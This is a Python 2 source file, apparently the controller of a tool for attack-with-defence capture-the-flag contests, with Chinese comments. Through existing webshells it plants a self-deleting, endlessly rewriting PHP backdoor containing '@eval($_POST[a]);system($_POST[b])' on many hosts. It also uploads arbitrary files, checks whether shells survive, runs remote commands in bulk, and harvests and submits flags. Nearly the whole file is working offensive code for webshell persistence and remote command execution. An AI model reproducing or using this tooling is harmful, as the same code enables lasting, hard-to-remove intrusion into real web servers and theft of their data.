# -*- coding:utf-8 -*-

import file_module
import request_module
import upload_module
import flag_module
import time

def flag_upload_address():#读取flag上传地址，填在flag_upload_address.txt里，没有可以不填。
	print "*******************************************************"
	print "**************Flag_Upload_Module_Loading***************"
	print "*******************************************************"
	global flag_upload_address
	time.sleep(1)
	flag_upload_address = file_module.read_txt_variable("flag_upload_address.txt")
	request_module.test(flag_upload_address)

def team_token():#队伍token读取，填在team_token.txt里，没有可以不填。
	print "*******************************************************"
	print "**************Team_Token_Module_Loading****************"
	print "*******************************************************"
	time.sleep(1)
	global team_token
	team_token = file_module.read_txt_variable("team_token.txt")
	
def team_base_url_list():#靶机shell路径，不包括shell本身，例如http://192.168.0.1/www/html/shell.php，填http://192.168.0.1/www/html/即可，填在team_base_url_list.txt，每个靶机独立一行，数量应一致。
	print "*******************************************************"
	print "***************Team_Url_Module_Loading*****************"
	print "*******************************************************"
	time.sleep(1)
	global team_base_url_list
	team_base_url_list = file_module.read_txt_array("team_base_url_list.txt")

def webshell_url():#靶机shell本身，填入shell名字,例如shell.php，config.php等，填在webshell.txt，每个靶机独立一行，数量应一致。
	print "*******************************************************"
	print "**************Webshell_Module_Loading******************"
	print "*******************************************************"
	time.sleep(1)
	global team_base_url_list
	global webshell
	webshell = file_module.read_txt_array("webshell.txt")
	webshell_url = []
	for i in range(len(webshell)):
		webshell_url.append(team_base_url_list[i]+webshell[i])
		try:
			request_module.test(webshell_url[i])
			print webshell_url[i],"Works Well"
			print "*******************************************************"
		except:
			print webshell_url[i],"Fail"
			print "*******************************************************"
	
def trojan_url():#将要植入的不死马名称，可以随意填写，填在trojan.txt，每个靶机独立一行，数量应一致。
	print "*******************************************************"
	print "****************Trojan_Module_Loading******************"
	print "*******************************************************"
	time.sleep(1)
	global team_base_url_list
	global trojan
	trojan = file_module.read_txt_array("trojan.txt")
	trojan_url = []
	for i in range(len(trojan)):
		trojan_url.append(team_base_url_list[i]+trojan[i])
		upload_module.check(trojan_url[i])
		print "*******************************************************"

			
def trojan_implant():#植入木马，通过执行php命令写入木马，预置php不死马，内容可以自定义。
	print "*******************************************************"
	print "**************Implant_Module_Loading*******************"
	print "*******************************************************"
	time.sleep(1)
	global team_base_url_list
	global webshell
	global trojan
	key = raw_input("Input Your Webshell's Password:")#一句话木马的密码。
	for i in range(len(team_base_url_list)):#以下为自定义内容。
		payload = ''
		payload += 'ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file='
		payload += "'"
		payload += trojan[i]
		payload += "'"
		payload += ';$code='
		payload += "'"
		payload += '<?php @eval($_POST[a]);system($_POST[b]); ?>'
		payload += "'"
		payload += ';while(1){file_put_contents($file,$code);usleep(5000);}'
		#以上为自定义内容。
		trojan_data = {key:payload}
		upload_module.implant(team_base_url_list[i],webshell[i],trojan[i],trojan_data)
		
def file_implant():#植入文件，通过执行php命令写入，内容在file_data.txt填入。
	print "*******************************************************"
	print "**************File_Upload_Module_Loading***************"
	print "*******************************************************"
	time.sleep(1)
	global team_base_url_list
	global webshell
	file_name = raw_input("Input Your File's Name:")
	file_data = file_module.read_txt_variable("file_data.txt")
	payload = ''
	payload += '$file='
	payload += "'"
	payload += file_name
	payload += "';"
	payload += '$code='
	payload += "'"
	payload += file_data
	payload += "';"
	payload += 'file_put_contents($file,$code);'
	key = raw_input("Input Your Webshell's Password:")#一句话木马的密码。
	file_data = {key:payload}
	for i in range(len(team_base_url_list)):
		upload_module.implant(team_base_url_list[i],webshell[i],file_name,file_data)

def living_check():#存活检测，检测一开始的webshell以及后面植入的木马存活。
	print "*******************************************************"
	print "*************Living_Check_Module_Loading***************"
	print "*******************************************************"
	time.sleep(1)
	webshell_count = 0
	trojan_count = 0
	global webshell_list
	global trojan_list
	global webshell_fail_list
	global trojan_fail_list
	webshell_list = []
	trojan_list = []
	webshell_fail_list = []
	trojan_fail_list = []
	for i in range(len(team_base_url_list)):
		webshell_live = upload_module.check(team_base_url_list[i]+webshell[i])
		trojan_live =upload_module.check(team_base_url_list[i]+trojan[i])
		if (webshell_live == 1):
			webshell_count += 1
			webshell_list.append(team_base_url_list[i]+webshell[i])
		if (webshell_live == 0):
			webshell_fail_list.append(team_base_url_list[i]+webshell[i])
		if (trojan_live == 1):
			trojan_count += 1
			trojan_list.append(team_base_url_list[i]+trojan[i])
		if (trojan_live == 0):
			trojan_fail_list.append(team_base_url_list[i]+trojan[i])
	print webshell_count,'Teams Webshell Living.'
	for i in range(len(webshell_list)):
		print "Team",i,":",webshell_list[i]
	print "*******************************************************"
	print trojan_count,'Teams Trojan Living.'
	for i in range(len(trojan_list)):
		print "Team",i,":",trojan_list[i]
	print "*******************************************************"

def remote_command():#单个靶机RCE，输入stop停止。
	print "*******************************************************"
	print "*************Remote_Command_Module_Loading*************"
	print "*******************************************************"
	time.sleep(1)
	global webshell_list
	global trojan_list
	choose_team = int(raw_input('Input A Team:'))
	stop = 0
	while (stop != 1):
		stop=flag_module.rce(trojan_list[choose_team])

def remote_command_multi():#批量靶机RCE，输入stop停止。
	print "*******************************************************"
	print "*********Remote_Command_Multi_Module_Loading***********"
	print "*******************************************************"
	global trojan_list
	time.sleep(2)
	multi_command = raw_input("Command:")
	while (1):
		if multi_command == 'stop':
			break
		for i in range(len(trojan_list)):
			flag_module.rce_multi(trojan_list[i],multi_command)
		multi_command = raw_input("Command:")
		
def confirm():#确认当前配置。
	print "*******************************************************"
	print "****************Confirm_Module_Loading*****************"
	print "*******************************************************"
	time.sleep(1)
	global flag_upload_address
	global team_token
	print "The Flag Upload Address:",flag_upload_address
	print "*******************************************************"
	print "The Team Token:",team_token
	print "*******************************************************"
	for i in range(len(team_base_url_list)):
		print team_base_url_list[i]
	print "Total Team Number:",len(team_base_url_list)
	print "*******************************************************"
	for i in range(len(webshell)):
		print webshell[i]
	print "Total Webshell:",len(webshell)
	print "*******************************************************"
	for i in range(len(trojan)):
		print trojan[i]
	print "Total Trojan:",len(trojan)
	print "*******************************************************"
	
def catch_flag():#获取flag
	print "*******************************************************"
	print "***************Catch_Flag_Module_Loading***************"
	print "*******************************************************"
	time.sleep(1)
	global trojan_list
	for i in range(len(trojan_list)):
		flag_module.get_flag(trojan_list[i])
	print "*******************************************************"

def store_flag():#获取flag并且存在flag.txt中。
	print "*******************************************************"
	print "***************Store_Flag_Module_Loading***************"
	print "*******************************************************"
	time.sleep(1)
	global trojan_list
	for i in range(len(trojan_list)):
		flag = flag_module.get_store_flag(trojan_list[i])
		file_module.write_txt("flag.txt",flag)
	file_module.write_txt("flag.txt","*******************************************************\r\n")

def upload_flag():#提交flag
	print "*******************************************************"
	print "**************Upload_Flag_Module_Loading***************"
	print "*******************************************************"
	time.sleep(1)
	global flag_upload_address
	global team_token
	for i in range(len(trojan_list)):
		flag = flag_module.get_store_flag(trojan_list[i])
		payload = {'token':team_token,'flag':flag}
		request_module.get(flag_upload_address,payload)
	print "*******************************************************"
	